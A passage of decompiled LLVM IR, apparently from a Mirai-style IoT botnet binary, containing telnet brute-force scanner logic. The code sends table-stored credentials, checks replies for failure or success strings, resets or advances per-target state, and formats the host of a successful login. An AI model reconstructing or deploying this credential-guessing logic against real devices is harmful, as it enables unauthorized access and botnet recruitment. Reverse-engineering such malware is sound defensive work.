  %v5_804ac55 = load i8, i8* %v4_804ac55, align 2
  %v6_804ac55 = zext i8 %v5_804ac55 to i32
  store i32 %v6_804ac55, i32* %eax.global-to-local, align 4
  %v1_804ac5d = mul nuw nsw i32 %v6_804ac55, 4
  %v2_804ac5d = add nuw nsw i32 %v1_804ac5d, 134584224
  %v3_804ac5d = inttoptr i32 %v2_804ac5d to i32*
  %v4_804ac5d = load i32, i32* %v3_804ac5d, align 4
  %v1_804ac6f = and i32 %v4_804ac5d, -256
  store i32 %v1_804ac6f, i32* %eax.global-to-local, align 4
  %v4_804ac72 = inttoptr i32 %v4_804ac5d to i8*
  store i32 %v4_804ac5d, i32* @edi, align 4
  %v3_804ac78 = call i32 @_strlen(i8* %v4_804ac72)
  store i32 %v3_804ac78, i32* @esi, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v5_804ac97 = load i8, i8* %v4_804ac55, align 2
  %v6_804ac97 = zext i8 %v5_804ac97 to i32
  store i32 %v6_804ac97, i32* %eax.global-to-local, align 4
  %v1_804ac9f = mul nuw nsw i32 %v6_804ac97, 4
  %v2_804ac9f = add nuw nsw i32 %v1_804ac9f, 134584224
  %v3_804ac9f = inttoptr i32 %v2_804ac9f to i32*
  %v4_804ac9f = load i32, i32* %v3_804ac9f, align 4
  store i32 %v4_804ac9f, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804acbc = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804acbc = load i32, i32* %v3_804acbc, align 4
  store i32 %v4_804acbc, i32* %eax.global-to-local, align 4
  %v0_804acbf = load i32, i32* @esp, align 4
  %v1_804acbf = add i32 %v0_804acbf, 12
  %v2_804acbf = inttoptr i32 %v1_804acbf to i32*
  store i32 16384, i32* %v2_804acbf, align 4
  %v0_804acc7 = load i32, i32* @esi, align 4
  %v1_804acc7 = load i32, i32* @esp, align 4
  %v2_804acc7 = add i32 %v1_804acc7, 8
  %v3_804acc7 = inttoptr i32 %v2_804acc7 to i32*
  store i32 %v0_804acc7, i32* %v3_804acc7, align 4
  %v0_804accb = load i32, i32* @ebx, align 4
  %v1_804accb = load i32, i32* @esp, align 4
  %v2_804accb = add i32 %v1_804accb, 4
  %v3_804accb = inttoptr i32 %v2_804accb to i32*
  store i32 %v0_804accb, i32* %v3_804accb, align 4
  %v0_804accf = load i32, i32* %eax.global-to-local, align 4
  %v1_804accf = load i32, i32* @esp, align 4
  %v2_804accf = inttoptr i32 %v1_804accf to i32*
  store i32 %v0_804accf, i32* %v2_804accf, align 4
  %v4_804acd2 = call i32 @__libc_send(i32 %v4_804ac5d, i32 %v2_804a3bd, i32 %v6_804a502, i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804acd2, i32* %eax.global-to-local, align 4
  %v2_804acd7 = icmp slt i32 %v4_804acd2, 0
  %v1_804acd9 = icmp eq i1 %v2_804acd7, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804acd9, label %dec_label_pc_804ad01, label %dec_label_pc_804acdb

dec_label_pc_804acdb:                             ; preds = %dec_label_pc_804ac3f
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804acf4 = load i32, i32* @esp, align 4
  %v2_804acf4 = inttoptr i32 %v1_804acf4 to i32*
  store i32 %v2_804a4b4, i32* %v2_804acf4, align 4
  %v1_804acf7 = call i32 @reset_telstate(i32 %v4_804ac5d)
  store i32 %v1_804acf7, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804ad01:                             ; preds = %dec_label_pc_804ac3f
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804ad17 = load i32, i32* %v3_804acbc, align 4
  store i32 %v4_804ad17, i32* %eax.global-to-local, align 4
  %v0_804ad1a = load i32, i32* @esp, align 4
  %v1_804ad1a = add i32 %v0_804ad1a, 12
  %v2_804ad1a = inttoptr i32 %v1_804ad1a to i32*
  store i32 16384, i32* %v2_804ad1a, align 4
  %v0_804ad22 = load i32, i32* @esp, align 4
  %v1_804ad22 = add i32 %v0_804ad22, 8
  %v2_804ad22 = inttoptr i32 %v1_804ad22 to i32*
  store i32 2, i32* %v2_804ad22, align 4
  %v0_804ad2a = load i32, i32* @esp, align 4
  %v1_804ad2a = add i32 %v0_804ad2a, 4
  %v2_804ad2a = inttoptr i32 %v1_804ad2a to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8056738.57 to i32), i32* %v2_804ad2a, align 4
  %v0_804ad32 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad32 = load i32, i32* @esp, align 4
  %v2_804ad32 = inttoptr i32 %v1_804ad32 to i32*
  store i32 %v0_804ad32, i32* %v2_804ad32, align 4
  %v4_804ad35 = call i32 @__libc_send(i32 %v4_804ac5d, i32 %v2_804a3bd, i32 %v6_804a502, i32 ptrtoint (i32* @0 to i32))
  %v2_804ad3a = icmp slt i32 %v4_804ad35, 0
  %v1_804ad3c = icmp eq i1 %v2_804ad3a, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804ad7d = load i32, i32* @esp, align 4
  br i1 %v1_804ad3c, label %dec_label_pc_804ad64, label %dec_label_pc_804ad3e

dec_label_pc_804ad3e:                             ; preds = %dec_label_pc_804ad01
  %v2_804ad57 = inttoptr i32 %v0_804ad7d to i32*
  store i32 %v2_804a4b4, i32* %v2_804ad57, align 4
  %v1_804ad5a = call i32 @reset_telstate(i32 %v4_804ac5d)
  store i32 %v1_804ad5a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804ad64:                             ; preds = %dec_label_pc_804ad01
  %v1_804ad7d = add i32 %v0_804ad7d, 4
  %v2_804ad7d = inttoptr i32 %v1_804ad7d to i32*
  store i32 4, i32* %v2_804ad7d, align 4
  %v0_804ad85 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ad85 = load i32, i32* @esp, align 4
  %v2_804ad85 = inttoptr i32 %v1_804ad85 to i32*
  store i32 %v0_804ad85, i32* %v2_804ad85, align 4
  %v2_804ad88 = inttoptr i32 %v4_804ac5d to i32*
  %v3_804ad88 = call i32 @advance_state(i32* %v2_804ad88, i32 %v2_804a3bd)
  store i32 %v3_804ad88, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804ad92:                             ; preds = %dec_label_pc_804a4ec
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  %v1_804adaa = add i32 %v2_804a4b4, 24
  store i32 %v1_804adaa, i32* %eax.global-to-local, align 4
  %v1_804adad = inttoptr i32 %v1_804adaa to i32*
  %v2_804adad = load i32, i32* %v1_804adad, align 4
  store i32 %v2_804adad, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804adc5 = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804adc5 = load i32, i32* %v3_804adc5, align 4
  store i32 %v4_804adc5, i32* %edx.global-to-local, align 4
  %v0_804adc8 = load i32, i32* @esp, align 4
  %v1_804adc8 = add i32 %v0_804adc8, 16
  %v2_804adc8 = inttoptr i32 %v1_804adc8 to i32*
  store i32 ptrtoint (i32* @global_var_8059d4c to i32), i32* %v2_804adc8, align 4
  %v0_804add0 = load i32, i32* @esp, align 4
  %v1_804add0 = add i32 %v0_804add0, 12
  %v2_804add0 = inttoptr i32 %v1_804add0 to i32*
  store i32 1024, i32* %v2_804add0, align 4
  %v0_804add8 = load i32, i32* @ebx, align 4
  %v1_804add8 = load i32, i32* @esp, align 4
  %v2_804add8 = add i32 %v1_804add8, 8
  %v3_804add8 = inttoptr i32 %v2_804add8 to i32*
  store i32 %v0_804add8, i32* %v3_804add8, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804addf = load i32, i32* @esp, align 4
  %v2_804addf = add i32 %v1_804addf, 4
  %v3_804addf = inttoptr i32 %v2_804addf to i32*
  store i32 %arg1, i32* %v3_804addf, align 4
  %v0_804ade3 = load i32, i32* %edx.global-to-local, align 4
  %v1_804ade3 = load i32, i32* @esp, align 4
  %v2_804ade3 = inttoptr i32 %v1_804ade3 to i32*
  store i32 %v0_804ade3, i32* %v2_804ade3, align 4
  %v1_804ade6 = call i32 @read_until_response(i32 %v6_804a502)
  %v1_804adeb = icmp eq i32 %v1_804ade6, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  br i1 %v1_804adeb, label %dec_label_pc_804ae78, label %dec_label_pc_804adf3

dec_label_pc_804adf3:                             ; preds = %dec_label_pc_804ad92
  store i32 %v1_804adaa, i32* %eax.global-to-local, align 4
  %v2_804ae0e = load i32, i32* %v1_804adad, align 4
  store i32 %v2_804ae0e, i32* %eax.global-to-local, align 4
  %v1_804ae10 = load i32, i32* @esp, align 4
  %v2_804ae10 = inttoptr i32 %v1_804ae10 to i32*
  store i32 %v2_804ae0e, i32* %v2_804ae10, align 4
  %v1_804ae13 = call i32 @contains_fail(i32 %stack_var_-624.247)
  %v1_804ae18 = icmp eq i32 %v1_804ae13, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804ae63 = load i32, i32* @esp, align 4
  %v1_804ae63 = add i32 %v0_804ae63, 4
  %v2_804ae63 = inttoptr i32 %v1_804ae63 to i32*
  br i1 %v1_804ae18, label %dec_label_pc_804ae4a, label %dec_label_pc_804ae1c

dec_label_pc_804ae1c:                             ; preds = %dec_label_pc_804adf3
  store i32 0, i32* %v2_804ae63, align 4
  %v0_804ae3d = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae3d = load i32, i32* @esp, align 4
  %v2_804ae3d = inttoptr i32 %v1_804ae3d to i32*
  store i32 %v0_804ae3d, i32* %v2_804ae3d, align 4
  %v2_804ae40 = inttoptr i32 %stack_var_-624.247 to i32*
  %v3_804ae40 = call i32 @advance_state(i32* %v2_804ae40, i32 %v2_804a3bd)
  store i32 %v3_804ae40, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804ae4a:                             ; preds = %dec_label_pc_804adf3
  store i32 5, i32* %v2_804ae63, align 4
  %v0_804ae6b = load i32, i32* %eax.global-to-local, align 4
  %v1_804ae6b = load i32, i32* @esp, align 4
  %v2_804ae6b = inttoptr i32 %v1_804ae6b to i32*
  store i32 %v0_804ae6b, i32* %v2_804ae6b, align 4
  %v2_804ae6e = inttoptr i32 %stack_var_-624.247 to i32*
  %v3_804ae6e = call i32 @advance_state(i32* %v2_804ae6e, i32 %v2_804a3bd)
  store i32 %v3_804ae6e, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804ae78:                             ; preds = %dec_label_pc_804ad92
  store i32 %v1_804a4b6, i32* %eax.global-to-local, align 4
  %v2_804ae93 = load i32, i32* %v1_804a4b9, align 4
  store i32 %v2_804ae93, i32* %eax.global-to-local, align 4
  %v1_804ae95 = add i32 %v2_804ae93, 3
  store i32 %v1_804ae95, i32* @ebx, align 4
  %v0_804ae98 = load i32, i32* @esp, align 4
  %v1_804ae98 = inttoptr i32 %v0_804ae98 to i32*
  store i32 0, i32* %v1_804ae98, align 4
  %v1_804ae9f = inttoptr i32 %stack_var_-624.247 to i32*
  %v2_804ae9f = call i32 @__GI_time(i32* %v1_804ae9f)
  store i32 %v2_804ae9f, i32* %eax.global-to-local, align 4
  %v0_804aea4 = load i32, i32* @ebx, align 4
  %v7_804aea4 = icmp ult i32 %v0_804aea4, %v2_804ae9f
  %v1_804aea6 = icmp eq i1 %v7_804aea4, false
  br i1 %v1_804aea6, label %dec_label_pc_804b42f, label %dec_label_pc_804aeac

dec_label_pc_804aeac:                             ; preds = %dec_label_pc_804ae78
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804aec5 = load i32, i32* @esp, align 4
  %v2_804aec5 = inttoptr i32 %v1_804aec5 to i32*
  store i32 %v2_804a4b4, i32* %v2_804aec5, align 4
  %v1_804aec8 = call i32 @reset_telstate(i32 %stack_var_-624.247)
  store i32 %v1_804aec8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804aed2:                             ; preds = %dec_label_pc_804a4ec
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804aee8 = add i32 %v2_804a633, %v2_804a4b2
  %v4_804aee8 = inttoptr i32 %v3_804aee8 to i8*
  %v5_804aee8 = load i8, i8* %v4_804aee8, align 1
  %v6_804aee8 = zext i8 %v5_804aee8 to i32
  store i32 %v6_804aee8, i32* %eax.global-to-local, align 4
  %v1_804aef0 = mul nuw nsw i32 %v6_804aee8, 4
  %v2_804aef0 = add nuw nsw i32 %v1_804aef0, 134584288
  %v3_804aef0 = inttoptr i32 %v2_804aef0 to i32*
  %v4_804aef0 = load i32, i32* %v3_804aef0, align 4
  %v1_804af02 = and i32 %v4_804aef0, -256
  store i32 %v1_804af02, i32* %eax.global-to-local, align 4
  %v4_804af05 = inttoptr i32 %v4_804aef0 to i8*
  store i32 %v4_804aef0, i32* @edi, align 4
  %v3_804af0b = call i32 @_strlen(i8* %v4_804af05)
  store i32 %v3_804af0b, i32* @esi, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v5_804af2a = load i8, i8* %v4_804aee8, align 1
  %v6_804af2a = zext i8 %v5_804af2a to i32
  store i32 %v6_804af2a, i32* %eax.global-to-local, align 4
  %v1_804af32 = mul nuw nsw i32 %v6_804af2a, 4
  %v2_804af32 = add nuw nsw i32 %v1_804af32, 134584288
  %v3_804af32 = inttoptr i32 %v2_804af32 to i32*
  %v4_804af32 = load i32, i32* %v3_804af32, align 4
  store i32 %v4_804af32, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804af4f = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804af4f = load i32, i32* %v3_804af4f, align 4
  store i32 %v4_804af4f, i32* %eax.global-to-local, align 4
  %v0_804af52 = load i32, i32* @esp, align 4
  %v1_804af52 = add i32 %v0_804af52, 12
  %v2_804af52 = inttoptr i32 %v1_804af52 to i32*
  store i32 16384, i32* %v2_804af52, align 4
  %v0_804af5a = load i32, i32* @esi, align 4
  %v1_804af5a = load i32, i32* @esp, align 4
  %v2_804af5a = add i32 %v1_804af5a, 8
  %v3_804af5a = inttoptr i32 %v2_804af5a to i32*
  store i32 %v0_804af5a, i32* %v3_804af5a, align 4
  %v0_804af5e = load i32, i32* @ebx, align 4
  %v1_804af5e = load i32, i32* @esp, align 4
  %v2_804af5e = add i32 %v1_804af5e, 4
  %v3_804af5e = inttoptr i32 %v2_804af5e to i32*
  store i32 %v0_804af5e, i32* %v3_804af5e, align 4
  %v0_804af62 = load i32, i32* %eax.global-to-local, align 4
  %v1_804af62 = load i32, i32* @esp, align 4
  %v2_804af62 = inttoptr i32 %v1_804af62 to i32*
  store i32 %v0_804af62, i32* %v2_804af62, align 4
  %v4_804af65 = call i32 @__libc_send(i32 %v4_804aef0, i32 %stack_var_-624.247, i32 %v2_804a3bd, i32 %v6_804a502)
  store i32 %v4_804af65, i32* %eax.global-to-local, align 4
  %v2_804af6a = icmp slt i32 %v4_804af65, 0
  %v1_804af6c = icmp eq i1 %v2_804af6a, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804af6c, label %dec_label_pc_804af94, label %dec_label_pc_804af6e

dec_label_pc_804af6e:                             ; preds = %dec_label_pc_804aed2
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804af87 = load i32, i32* @esp, align 4
  %v2_804af87 = inttoptr i32 %v1_804af87 to i32*
  store i32 %v2_804a4b4, i32* %v2_804af87, align 4
  %v1_804af8a = call i32 @reset_telstate(i32 %v4_804aef0)
  store i32 %v1_804af8a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804af94:                             ; preds = %dec_label_pc_804aed2
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v4_804afaa = load i32, i32* %v3_804af4f, align 4
  store i32 %v4_804afaa, i32* %eax.global-to-local, align 4
  %v0_804afad = load i32, i32* @esp, align 4
  %v1_804afad = add i32 %v0_804afad, 12
  %v2_804afad = inttoptr i32 %v1_804afad to i32*
  store i32 16384, i32* %v2_804afad, align 4
  %v0_804afb5 = load i32, i32* @esp, align 4
  %v1_804afb5 = add i32 %v0_804afb5, 8
  %v2_804afb5 = inttoptr i32 %v1_804afb5 to i32*
  store i32 2, i32* %v2_804afb5, align 4
  %v0_804afbd = load i32, i32* @esp, align 4
  %v1_804afbd = add i32 %v0_804afbd, 4
  %v2_804afbd = inttoptr i32 %v1_804afbd to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8056738.57 to i32), i32* %v2_804afbd, align 4
  %v0_804afc5 = load i32, i32* %eax.global-to-local, align 4
  %v1_804afc5 = load i32, i32* @esp, align 4
  %v2_804afc5 = inttoptr i32 %v1_804afc5 to i32*
  store i32 %v0_804afc5, i32* %v2_804afc5, align 4
  %v4_804afc8 = call i32 @__libc_send(i32 %v4_804aef0, i32 %stack_var_-624.247, i32 %v2_804a3bd, i32 %v6_804a502)
  %v2_804afcd = icmp slt i32 %v4_804afc8, 0
  %v1_804afcf = icmp eq i1 %v2_804afcd, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804b010 = load i32, i32* @esp, align 4
  br i1 %v1_804afcf, label %dec_label_pc_804aff7, label %dec_label_pc_804afd1

dec_label_pc_804afd1:                             ; preds = %dec_label_pc_804af94
  %v2_804afea = inttoptr i32 %v0_804b010 to i32*
  store i32 %v2_804a4b4, i32* %v2_804afea, align 4
  %v1_804afed = call i32 @reset_telstate(i32 %v4_804aef0)
  store i32 %v1_804afed, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804aff7:                             ; preds = %dec_label_pc_804af94
  %v1_804b010 = add i32 %v0_804b010, 4
  %v2_804b010 = inttoptr i32 %v1_804b010 to i32*
  store i32 6, i32* %v2_804b010, align 4
  %v0_804b018 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b018 = load i32, i32* @esp, align 4
  %v2_804b018 = inttoptr i32 %v1_804b018 to i32*
  store i32 %v0_804b018, i32* %v2_804b018, align 4
  %v2_804b01b = inttoptr i32 %v4_804aef0 to i32*
  %v3_804b01b = call i32 @advance_state(i32* %v2_804b01b, i32 %stack_var_-624.247)
  store i32 %v3_804b01b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804b025:                             ; preds = %dec_label_pc_804a4ec
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  %v1_804b03d = add i32 %v2_804a4b4, 24
  store i32 %v1_804b03d, i32* %eax.global-to-local, align 4
  %v1_804b040 = inttoptr i32 %v1_804b03d to i32*
  %v2_804b040 = load i32, i32* %v1_804b040, align 4
  store i32 %v2_804b040, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804b058 = inttoptr i32 %v2_804a4b4 to i32*
  %v4_804b058 = load i32, i32* %v3_804b058, align 4
  store i32 %v4_804b058, i32* %edx.global-to-local, align 4
  %v0_804b05b = load i32, i32* @esp, align 4
  %v1_804b05b = add i32 %v0_804b05b, 16
  %v2_804b05b = inttoptr i32 %v1_804b05b to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_8059da0.58 to i32), i32* %v2_804b05b, align 4
  %v0_804b063 = load i32, i32* @esp, align 4
  %v1_804b063 = add i32 %v0_804b063, 12
  %v2_804b063 = inttoptr i32 %v1_804b063 to i32*
  store i32 1024, i32* %v2_804b063, align 4
  %v0_804b06b = load i32, i32* @ebx, align 4
  %v1_804b06b = load i32, i32* @esp, align 4
  %v2_804b06b = add i32 %v1_804b06b, 8
  %v3_804b06b = inttoptr i32 %v2_804b06b to i32*
  store i32 %v0_804b06b, i32* %v3_804b06b, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v1_804b072 = load i32, i32* @esp, align 4
  %v2_804b072 = add i32 %v1_804b072, 4
  %v3_804b072 = inttoptr i32 %v2_804b072 to i32*
  store i32 %arg1, i32* %v3_804b072, align 4
  %v0_804b076 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b076 = load i32, i32* @esp, align 4
  %v2_804b076 = inttoptr i32 %v1_804b076 to i32*
  store i32 %v0_804b076, i32* %v2_804b076, align 4
  %v1_804b079 = call i32 @read_until_response(i32 %v6_804a502)
  store i32 %v1_804b079, i32* %eax.global-to-local, align 4
  %v1_804b07e = icmp eq i32 %v1_804b079, 0
  br i1 %v1_804b07e, label %dec_label_pc_804b265, label %dec_label_pc_804b086

dec_label_pc_804b086:                             ; preds = %dec_label_pc_804b025
  store i32 %storemerge49, i32* @ebx, align 4
  %v0_804b089 = load i32, i32* @esp, align 4
  %v1_804b089 = inttoptr i32 %v0_804b089 to i32*
  store i32 0, i32* %v1_804b089, align 4
  %v1_804b090 = inttoptr i32 %stack_var_-628.248 to i32*
  %v2_804b090 = call i32 @__GI_time(i32* %v1_804b090)
  store i32 %v2_804b090, i32* @esi, align 4
  %v0_804b09a = load i32, i32* @ebx, align 4
  %v2_804b0aa = mul i32 %v0_804b09a, 28
  %v1_804b0ae = add i32 %v2_804b0ac, %v2_804b0aa
  %v2_804b0b1 = inttoptr i32 %v1_804b0ae to i32*
  store i32 %v2_804b090, i32* %v2_804b0b1, align 4
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v1_804b03d, i32* %eax.global-to-local, align 4
  %v2_804b0ce = load i32, i32* %v1_804b040, align 4
  store i32 %v2_804b0ce, i32* %eax.global-to-local, align 4
  %v1_804b0d0 = load i32, i32* @esp, align 4
  %v2_804b0d0 = inttoptr i32 %v1_804b0d0 to i32*
  store i32 %v2_804b0ce, i32* %v2_804b0d0, align 4
  %v1_804b0d3 = call i32 @contains_fail(i32 %stack_var_-628.248)
  store i32 %v1_804b0d3, i32* %eax.global-to-local, align 4
  %v1_804b0d8 = icmp eq i32 %v1_804b0d3, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804b0d8, label %dec_label_pc_804b10a, label %dec_label_pc_804b0dc

dec_label_pc_804b0dc:                             ; preds = %dec_label_pc_804b086
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804b0f5 = load i32, i32* @esp, align 4
  %v1_804b0f5 = add i32 %v0_804b0f5, 4
  %v2_804b0f5 = inttoptr i32 %v1_804b0f5 to i32*
  store i32 0, i32* %v2_804b0f5, align 4
  %v0_804b0fd = load i32, i32* %eax.global-to-local, align 4
  %v1_804b0fd = load i32, i32* @esp, align 4
  %v2_804b0fd = inttoptr i32 %v1_804b0fd to i32*
  store i32 %v0_804b0fd, i32* %v2_804b0fd, align 4
  %v3_804b100 = call i32 @advance_state(i32* %v1_804b090, i32 %stack_var_-624.247)
  store i32 %v3_804b100, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804b10a:                             ; preds = %dec_label_pc_804b086
  store i32 %v1_804b03d, i32* %eax.global-to-local, align 4
  %v2_804b125 = load i32, i32* %v1_804b040, align 4
  store i32 %v2_804b125, i32* %eax.global-to-local, align 4
  %v1_804b127 = load i32, i32* @esp, align 4
  %v2_804b127 = inttoptr i32 %v1_804b127 to i32*
  store i32 %v2_804b125, i32* %v2_804b127, align 4
  %v1_804b12a = call i32 @contains_success(i32 %stack_var_-628.248)
  store i32 %v1_804b12a, i32* %eax.global-to-local, align 4
  %v1_804b12f = icmp eq i32 %v1_804b12a, 0
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804b12f, label %dec_label_pc_804b23f, label %dec_label_pc_804b137

dec_label_pc_804b137:                             ; preds = %dec_label_pc_804b10a
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804b14d = add i32 %v2_804a542, %v2_804a4b2
  %v4_804b14d = inttoptr i32 %v3_804b14d to i8*
  %v5_804b14d = load i8, i8* %v4_804b14d, align 1
  %v6_804b14d = zext i8 %v5_804b14d to i32
  store i32 %v6_804b14d, i32* %eax.global-to-local, align 4
  %v10_804b152 = icmp eq i8 %v5_804b14d, 2
  %v1_804b154 = icmp eq i1 %v10_804b152, false
  store i32 %v1_804a4a4, i32* @edx, align 4
  br i1 %v1_804b154, label %dec_label_pc_804b184, label %dec_label_pc_804b156

dec_label_pc_804b156:                             ; preds = %dec_label_pc_804b137
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804b16f = load i32, i32* @esp, align 4
  %v1_804b16f = add i32 %v0_804b16f, 4
  %v2_804b16f = inttoptr i32 %v1_804b16f to i32*
  store i32 7, i32* %v2_804b16f, align 4
  %v0_804b177 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b177 = load i32, i32* @esp, align 4
  %v2_804b177 = inttoptr i32 %v1_804b177 to i32*
  store i32 %v0_804b177, i32* %v2_804b177, align 4
  %v3_804b17a = call i32 @advance_state(i32* %v1_804b090, i32 %stack_var_-624.247)
  store i32 %v3_804b17a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b42f

dec_label_pc_804b184:                             ; preds = %dec_label_pc_804b137
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804b19a = add i32 %v2_804a633, %v2_804a4b2
  %v4_804b19a = inttoptr i32 %v3_804b19a to i8*
  %v5_804b19a = load i8, i8* %v4_804b19a, align 1
  %v6_804b19a = zext i8 %v5_804b19a to i32
  store i32 %v6_804b19a, i32* %eax.global-to-local, align 4
  %v1_804b1a2 = mul nuw nsw i32 %v6_804b19a, 4
  %v2_804b1a2 = add nuw nsw i32 %v1_804b1a2, 134584288
  %v3_804b1a2 = inttoptr i32 %v2_804b1a2 to i32*
  %v4_804b1a2 = load i32, i32* %v3_804b1a2, align 4
  store i32 %v4_804b1a2, i32* @ebx, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b2, i32* %eax.global-to-local, align 4
  %v3_804b1bf = add i32 %v2_804a67a, %v2_804a4b2
  %v4_804b1bf = inttoptr i32 %v3_804b1bf to i8*
  %v5_804b1bf = load i8, i8* %v4_804b1bf, align 2
  %v6_804b1bf = zext i8 %v5_804b1bf to i32
  store i32 %v6_804b1bf, i32* %eax.global-to-local, align 4
  %v1_804b1c7 = mul nuw nsw i32 %v6_804b1bf, 4
  %v2_804b1c7 = add nuw nsw i32 %v1_804b1c7, 134584224
  %v3_804b1c7 = inttoptr i32 %v2_804b1c7 to i32*
  %v4_804b1c7 = load i32, i32* %v3_804b1c7, align 4
  store i32 %v4_804b1c7, i32* @esi, align 4
  store i32 %v1_804a4a4, i32* %edx.global-to-local, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v1_804b1e7 = load i32, i32* @esp, align 4
  %v2_804b1e7 = inttoptr i32 %v1_804b1e7 to i32*
  store i32 %v2_804a4b4, i32* %v2_804b1e7, align 4
  %v0_804b1ea = call i32 @get_telstate_host()
  store i32 %v0_804b1ea, i32* %eax.global-to-local, align 4
  %v0_804b1ef = load i32, i32* @global_var_805a080.18, align 128
  store i32 %v0_804b1ef, i32* %edx.global-to-local, align 4
  %v0_804b1f5 = load i32, i32* @ebx, align 4
  %v1_804b1f5 = load i32, i32* @esp, align 4
  %v2_804b1f5 = add i32 %v1_804b1f5, 16
  %v3_804b1f5 = inttoptr i32 %v2_804b1f5 to i32*
  store i32 %v0_804b1f5, i32* %v3_804b1f5, align 4
  %v0_804b1f9 = load i32, i32* @esi, align 4
  %v1_804b1f9 = load i32, i32* @esp, align 4
  %v2_804b1f9 = add i32 %v1_804b1f9, 12
  %v3_804b1f9 = inttoptr i32 %v2_804b1f9 to i32*
  store i32 %v0_804b1f9, i32* %v3_804b1f9, align 4
  %v1_804b1fd = load i32, i32* @esp, align 4
  %v2_804b1fd = add i32 %v1_804b1fd, 8
  %v3_804b1fd = inttoptr i32 %v2_804b1fd to i32*
  store i32 %v0_804b1ea, i32* %v3_804b1fd, align 4
  %v0_804b201 = load i32, i32* @esp, align 4
  %v1_804b201 = add i32 %v0_804b201, 4
  %v2_804b201 = inttoptr i32 %v1_804b201 to i32*
  store i32 ptrtoint (i32* @global_var_805673c.59 to i32), i32* %v2_804b201, align 4
  %v0_804b209 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b209 = load i32, i32* @esp, align 4
  %v2_804b209 = inttoptr i32 %v1_804b209 to i32*
  store i32 %v0_804b209, i32* %v2_804b209, align 4
  %v2_804b20c = call i32 @Rootsprintf(i32 %stack_var_-628.248, i32 %stack_var_-624.247)
  store i32 %v1_804a4a4, i32* @edx, align 4
  store i32 %v2_804a4b4, i32* %eax.global-to-local, align 4
  %v0_804b22a = load i32, i32* @esp, align 4
  %v1_804b22a = add i32 %v0_804b22a, 4
  %v2_804b22a = inttoptr i32 %v1_804b22a to i32*
  store i32 7, i32* %v2_804b22a, align 4
